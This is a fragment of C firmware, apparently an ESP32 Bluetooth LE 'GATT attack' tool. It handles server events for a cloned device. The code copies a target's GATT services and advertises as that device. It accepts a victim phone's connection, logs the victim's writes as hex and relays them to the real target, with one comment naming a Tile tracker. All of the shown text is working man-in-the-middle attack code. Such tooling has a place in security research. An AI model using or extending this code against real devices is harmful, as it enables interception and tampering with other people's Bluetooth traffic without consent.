// Included in GattAttack.c to share callback state within one C translation unit.
  case ESP_GATTS_EXEC_WRITE_EVT: {
    /**
     * This event comes when the
     * victim sends the exec write
     * or abort.
     *
     * This ends up logging the
     * prepared buffer and then
     * executing the write on
     * the attacking client.
     */
    bool execute = false;
    esp_ble_gatts_send_response(gatts_if, param->write.conn_id, param->write.trans_id, ESP_GATT_OK,
                                NULL);

    if (param->exec_write.exec_write_flag == ESP_GATT_PREP_WRITE_EXEC) {
      execute = true;
    }

    char *value = bytes_to_hex_string(prepare_write_env.prepare_buf, prepare_write_env.prepare_len);
    log_and_send_json(execute ? "EXEC WRITE" : "ABORT WRITE",
                      connected ? "victim -> target" : "victim -> cache", "", clone.gatts_if,
                      param->exec_write.conn_id, param->exec_write.trans_id, 0, 0, NULL,
                      execute ? value : "");

    esp_ble_gattc_execute_write(clone.gattc_if, param->exec_write.conn_id, execute);

    if (prepare_write_env.prepare_buf != NULL) {
      free(prepare_write_env.prepare_buf);
      prepare_write_env.prepare_buf = NULL;
    }

    prepare_write_env.prepare_len = 0;
    free(value);
    break;
  }
  case ESP_GATTS_CREATE_EVT: {
    /**
     * When the Service is registered, we
     * need to add characteristics and their
     * descriptors.
     */
    for (size_t i = 0; i < clone.num_services; i++) {
      bool matches = false;
      if (clone.services[i].service_uuid.len == ESP_UUID_LEN_16) {
        matches = (clone.services[i].service_uuid.uuid.uuid16 ==
                   param->create.service_id.id.uuid.uuid.uuid16);
      } else if (clone.services[i].service_uuid.len == ESP_UUID_LEN_32) {
        matches = (clone.services[i].service_uuid.uuid.uuid32 ==
                   param->create.service_id.id.uuid.uuid.uuid32);
      } else {
        matches = (memcmp(clone.services[i].service_uuid.uuid.uuid128,
                          param->create.service_id.id.uuid.uuid.uuid128, 16) == 0);
      }

      if (matches) {
        clone.services[i].service_id = param->create.service_id;
        for (size_t x = 0; x < clone.services[i].num_chars; x++) {
          esp_err_t add_char_ret = esp_ble_gatts_add_char(
              param->create.service_handle, &clone.services[i].chars[x].char_uuid,
              ESP_GATT_PERM_READ | ESP_GATT_PERM_WRITE, clone.services[i].chars[x].property,
              &clone.services[i].chars[x].value, NULL);
          if (add_char_ret != ESP_GATT_OK) {
            ESP_LOGE(TAG, "add_char_ret %s", esp_err_to_name(add_char_ret));
          }

          for (size_t y = 0; y < clone.services[i].chars[x].num_descs; y++) {
            esp_err_t add_desc_ret = esp_ble_gatts_add_char_descr(
                param->create.service_handle, &clone.services[i].chars[x].descs[y].desc_uuid,
                ESP_GATT_PERM_READ | ESP_GATT_PERM_WRITE,
                &clone.services[i].chars[x].descs[y].value, NULL);
            if (add_desc_ret != ESP_GATT_OK) {
              ESP_LOGE(TAG, "add_desc_ret %s", esp_err_to_name(add_char_ret));
            }
          }
        }
      }
    }

    esp_err_t ret = esp_ble_gatts_start_service(param->create.service_handle);
    if (ret != ESP_OK) {
      ESP_LOGI(TAG, "start service err: %s", esp_err_to_name(ret));
    }
    break;
  }
  case ESP_GATTS_START_EVT: {
    /**
     * When the GATT service is started
     * after successfully creating the
     * service and starting it inside
     * ESP_GATTS_CREATE_EVT.
     *
     * We check that we have our expected
     * amount of cloned services and start
     * advertising when we do.
     */
    cloned_service_num++;

    if (cloned_service_num >= clone.num_services) {
      gatt_send_output("GATT Clone Success", false);
      gattAttackState = GATT_ATTACK_STATE_RUNNING;
      gatt_send_state((int)gattAttackState);
      esp_ble_gap_start_advertising(&adv_params);
    }

    break;
  }
  case ESP_GATTS_CONNECT_EVT: {
    /**
     * Called when a client (victim) is
     * connected to our gatt server.
     *
     * We set connection parameters and
     * determine if the target device has
     * established a gatt connection.
     */
    esp_ble_conn_update_params_t conn_params = {0};
    memcpy(conn_params.bda, param->connect.remote_bda, sizeof(esp_bd_addr_t));

    /* For the IOS system, please reference the apple official documents about the ble connection
     * parameters restrictions. */
    conn_params.latency = 0;
    conn_params.max_int = 0x20; // max_int = 0x20*1.25ms = 40ms
    conn_params.min_int = 0x10; // min_int = 0x10*1.25ms = 20ms
    conn_params.timeout = 400;  // timeout = 400*10ms = 4000ms
    ESP_LOGI(TAG, "ESP_GATTS_CONNECT_EVT, conn_id %d, remote %02x:%02x:%02x:%02x:%02x:%02x:",
             param->connect.conn_id, param->connect.remote_bda[0], param->connect.remote_bda[1],
             param->connect.remote_bda[2], param->connect.remote_bda[3],
             param->connect.remote_bda[4], param->connect.remote_bda[5]);

    if (memcmp(clone.target_bda, param->connect.remote_bda, sizeof(clone.target_bda)) == 0) {
      gatt_send_output("TARGET DEVICE HAS CONNECTED TO OUR GATTS", false);
    } else {
      clone.victim_client_conn_id = param->connect.conn_id;
      clone.server_conn_id = param->connect.conn_id;
      uart_bridge_phone(true);
    }

    // update connection parameters for the peer device.
    esp_ble_gap_update_conn_params(&conn_params);
    break;
  }
  case ESP_GATTS_DISCONNECT_EVT: {
    /**
     * Called when a victim is disconnected
     */
    ESP_LOGI(TAG,
             "ESP_GATTS_DISCONNECT_EVT, disconnect reason 0x%x conn_id: %x - "
             "%02x:%02x:%02x:%02x:%02x:%02x:",
             param->disconnect.reason, param->disconnect.conn_id, param->disconnect.remote_bda[0],
             param->disconnect.remote_bda[1], param->disconnect.remote_bda[2],
             param->disconnect.remote_bda[3], param->disconnect.remote_bda[4],
             param->disconnect.remote_bda[5]);
    if (pending_write.active && pending_write.conn_id == param->disconnect.conn_id) {
      pending_write.active = false;
    }
    if (clone.victim_client_conn_id == param->disconnect.conn_id)
      uart_bridge_phone(false);
    if (!shutdown_gatt_attack)
      esp_ble_gap_start_advertising(&adv_params);
    break;
  }
  case ESP_GATTS_CONF_EVT: {
    /**
     * I believe this is called
     * after a successful notify/indicate
     * is sent.
     */
    if (param->conf.status != ESP_GATT_OK) {
      ESP_LOGI(TAG, "ESP_GATTS_CONF_EVT failed: status %d attr_handle %x", param->conf.status,
               param->conf.handle);
      esp_log_buffer_hex(TAG, param->conf.value, param->conf.len);
    }
    break;
  }
  case ESP_GATTS_MTU_EVT: {
    ESP_LOGI(TAG, "ESP_GATTS_MTU_EVT, MTU %d", param->mtu.mtu);
    // This is the phone's server-side connection, not the Tile's client
    // connection. MTU exchange with the Tile is initiated on client connect.
    break;
  }
